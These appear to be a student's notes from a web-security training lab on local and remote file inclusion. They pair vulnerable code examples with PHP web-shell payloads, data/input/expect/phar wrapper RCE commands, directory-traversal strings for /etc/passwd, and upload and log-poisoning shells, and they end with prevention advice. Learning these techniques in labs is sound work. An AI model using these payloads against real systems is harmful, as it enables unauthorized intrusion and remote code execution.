

## Local File Inclusion (LFI)


The most common place we usually find LFI within is templating engines.

This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter

LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions.

## Examples of Vulnerable Code

 For example, the page may have a `?language` GET parameter

e.g. `?language=es`

If we have control over the path being loaded, then we may be able to exploit this vulnerability to read other files and potentially reach remote code execution.

#### PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

Such functions include `include_once()`, `require()`, `require_once()`, `file_get_contents()`, and several others as well.

#### NodeJS

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

The following example shows how the `language` parameter is used to determine which directory to pull the `about.html` page from:

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

Unlike our earlier examples where GET parameters were specified after a (`?`) character in the URL, the above example takes the parameter from the URL path (e.g. `/about/en` or `/about/es`)

#### Java

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

#### .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

## Read vs Execute

The following table shows which functions may execute files and which only read file content:

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |


## Basic LFI

![[Pasted image 20250220125908.png]]
If we select a language by clicking on it (e.g. `Spanish`), we see that the content text changes to spanish:

```http
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```

Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.

```http
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```


## Path Traversal

In the earlier example, we read a file by specifying its `absolute path` (e.g. `/etc/passwd`). This would work if the whole input was used within the `include()` function without any additions, like the following example:

```php
include($_GET['language']);
```

For example, the `language` parameter may be used for the filename, and may be added after a directory, as follows:

```php
include("./languages/" . $_GET['language']);
```

So, we can use this trick to go back several directories until we reach the root path (i.e. `/`), and then specify our absolute file path (e.g. `../../../../etc/passwd`), and the file should exist:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```


>[!tip]
>**Tip:** It can always be useful to be efficient and not add unnecessary `../` several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of `../` that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with `/var/www/html/` we are `3` directories away from the root path, so we can use `../` 3 times (i.e. `../../../`).

## Filename Prefix

On some occasions, our input may be appended after a different string

```php
include("lang_" . $_GET['language']);
```


```
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
```

As expected, the error tells us that this file does not exist

prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories:

```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

>[!note]
>This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct. Furthermore, `any prefix appended to our input may break some file inclusion techniques` we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.


## Appended Extensions

Another very common example is when an extension is appended to the `language` parameter, as follows:

```php
include($_GET['language'] . ".php");
```

## Second-Order Attacks

As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a `Second Order Attack`.

This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`

If we craft a malicious LFI username (e.g. `../../../etc/passwd`)

**Note:** All techniques mentioned in this section should work with any LFI vulnerability, regardless of the back-end development language or framework.

# Basic Bypasses

## Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal

## Encoding

**Note:** For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

## Approved Paths


Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

## Appended Extension

With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).

There are a couple of other techniques we may use, but they are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`

#### Path Truncation

 Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension.


```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

#### Null Bytes

PHP versions before 5.5 were vulnerable to `null byte injection`

which means that adding a null byte (`%00`) would terminate the string so anything after wold be disregarded.

To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`),

#### quesiton

http://94.237.54.116:47273/index.php?language=languages//....//....//....//....//flag.txt


# PHP Filters

 If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

## Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

- resource
	- required for filter wrappers to specify the stream to apply filter to
- read
	- specify which resource to aplly filter to


4 types of filters available:
	1. [String Filters](https://www.php.net/manual/en/filters.string.php)
	2. [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
	3.  [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
	4.  [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)

the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

## Fuzzing for PHP Files

```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

## Standard PHP Inclusion

For example, let's try to include the `config.php` page (`.php` extension appended by web application):

```
http://<SERVER_IP>:<PORT>/index.php?language=config
```

This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF)


## Source Code Disclosure

 Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:
```url
php://filter/read=convert.base64-encode/resource=config
```

# PHP Wrappers

## Data

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code.

However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

#### Checking PHP Configurations

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx


```shell-session
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` 

#### Remote Code Execution

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```


Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

We may also use cURL for the same attack, as follows:

```shell
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data.

To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

## Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams.


##### find if its enabled in the config
```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

##### using it

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```



## REmote file inclusion

Remote file inclusion is aa vulnerable function that allows the inclusion of remote URLs

There are 2 benefits to this :

1. Enumerating local-only ports and web apps (i.e SSRF)
2. Gaiuning remote code execution by including a malicious script that we host

 The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various `SSRF` techniques, which may also be used with RFI vulnerabilities.
### Local vs remote file inclusion


| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `include`                    |        ✅         |      ✅      |       ✅        |

Almost any RFI vulnerability is also an LFI vuln as any function that allow poassing urls usually also allows including local ones. 

This does not mean any LFI is also and RFI, this is due to the following:

1. The function may not allow including remote urls
2. you may only control a protion of the filename and not the entrie protocol wrapper (ex :htpp://, ftp://, https://)
3. The configuration myay prevent RFI alothgether, as modern web servers diable including remote files by default.

## Verify RFI

in most languages including remote URLs is considered a dangeruous securioty practice as it allows for multiple vulns. This is why remote URL inclusion is usually disabled by feault

```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

However here this is not a reliable indicator as even if this setting is enabled the function may not allow remote url inclusion. So a more reliable way to checks is to try and include a URL. 

- Always start off by testing with inluding a LOCAL URL to assure the attempt does not get blocked by firewalls

**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

## remote code execution with RFI

THE FIRST STEP in gaining remote exec is creating a malicious script in the lanmguage of the web app.

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

now all we need to do is host this script and include it in the RFI  vuln.



Tip: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

### hosting the shell with FTP


```shell
sudo python -m pyftpdlib -p 21
```

```shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

## SMB

if the vulnerable app is hosted onma  windows server ( we can tell from the server version in the HTTP response header) then we do not need the allow_url_inlcude setting to be enabled for RFI as SMB protocols allows remote file inclusion. 

This is because Windows treats files on remote SMB servers are normal files


```shell
impacket-smbserver -smb2support share $(pwd)
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`),

to specify the command use **&cmd=< command here>**


## LFI and File Uploads

File uplaod functionalites are ubiquitos in most modern web apps.
For attackers the ability to store files on the back end may extend the exploitation of many vulns.

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |
## Image uplaod

image uplaod is very commming in most moder web apps. 


#### crafing malicious image

first step iis to create a malicious iamge using php web shell code that still looks and works like an image.

1. use an allowed image extension in our file name e.g shell.gif
2. include the magic byets at the beggining oif the file content e.g gif8
```shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

this file on its own is harmless and wonta ffect normal web apps. However when combined with an LFI we can reach RCE

> [!note]
> We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.

## Zip Upload

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:


```shell
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:

```http
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log poisoning

We have seen in previous section that if we include any file that contains PHP code as long as the function has execute privileges.

Writing PHP cod in a filed we control get logged in to a log file (i.e poison/contaminate). 

## PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session`

and on backend they are saved in the following folders /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.

For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
we check if we can control the "page" parmaeter

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file.

We can then write php code to the session file e.g. an encoded webshell in php

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```


## Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

**Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

we can posion the logs by injecting the PHP shell into the User-Agent

![[Pasted image 20250221121336.png]]

We may also poison the log by sending a request through cURL, as follows:
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`


# Automated Scanning

## Fuzzing Parameters

However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

## LFI wordlists

 A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:
```shell-session
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## Fuzzing Server Files

Such files include: `Server webroot path`, `server configurations file`, and `server logs`.

```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
### Windows

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows


question

http://94.237.59.180:33606/index.php?view=

# File Inclusion Prevention

The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever.

If we cannot do that we should utilize a limited whitelist of allowed user inputs and match each input to the file to be loaded.

## Preventing Directory Traversal

The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has `basename()`,

Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```


## Web Server Configuration

In PHP this can be done by setting `allow_url_fopen` and `allow_url_include` to Off.

It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within `Docker`.

However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding `open_basedir = /var/www` in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html).

## Web Application Firewall (WAF)




http://94.237.54.190:32729/index.php?message=test#

http://94.237.55.96:32440/index.php?page=about